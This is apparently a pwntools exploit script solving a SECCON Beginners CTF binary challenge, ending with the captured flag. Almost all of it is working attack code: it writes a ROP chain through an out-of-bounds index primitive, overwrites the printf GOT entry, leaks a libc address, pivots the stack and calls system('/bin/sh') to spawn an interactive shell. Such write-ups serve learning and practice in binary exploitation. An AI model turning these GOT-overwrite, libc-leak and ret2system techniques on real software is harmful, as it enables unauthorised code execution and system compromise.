from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"


gdbscript = '''
gef
b *0x40088b
ignore 1 1
# b readlong
# ignore 2 4
# ignore 1 100
# ignore 1 5
# b *0x601020
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# io = remote('es.quals.beginners.seccon.jp', 9003)


addr_pop_rbp = 0x400658
addr_pop_rdi = 0x400893
addr_pop_rsi_r15 = 0x400891
addr_pop5 = 0x40088b
addr_leave = 0x40079c
addr_data = 0x0000000000601000
addr_pivot = addr_data + 0x500

rop = [
        # printf(elf.got["setbuf"]);
        addr_pop_rdi,
        elf.got["setbuf"],
        elf.plt["printf"] + 6,
        # read(0, addr_pivot, rdx); // rdx is luckily large after returing from printf
        addr_pop_rdi,
        0,
        addr_pop_rsi_r15,
        addr_pivot,
        0xdeadbeef,
        elf.plt['read'],
        addr_pop_rbp,
        addr_pivot - 8,
        addr_leave,
        ]

for i in range(len(rop)):
    io.recvuntil(b'index: ')
    io.sendline(b'%d' % i)
    io.recvuntil(b'value: ')
    io.sendline(b'%d' % rop[i])
    io.recvline()

io.recvuntil(b'index: ')
io.sendline(b'-2')
io.recvuntil(b'value: ')
io.sendline(b'%d' % elf.got['printf'])
io.recvline()

io.recvuntil(b'index: ')
io.sendline(p64(elf.plt['printf'] + 6))
io.recvuntil(b'value: ')
io.sendline(p64(addr_pop5))

data = io.recv().rstrip()
addr_libc = u64(data.ljust(8, b'\x00')) - 0x884d0
print('addr_libc = 0x{:x}'.format(addr_libc))

payload = b''
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh\x00')))
payload += p64(addr_libc + libc.symbols['system'])
io.sendline(payload)


io.interactive()


# ctf4b{4bus1ng_st4ck_d03snt_n3c3ss4r1ly_m34n_0v3rwr1t1ng_r3turn_4ddr3ss}
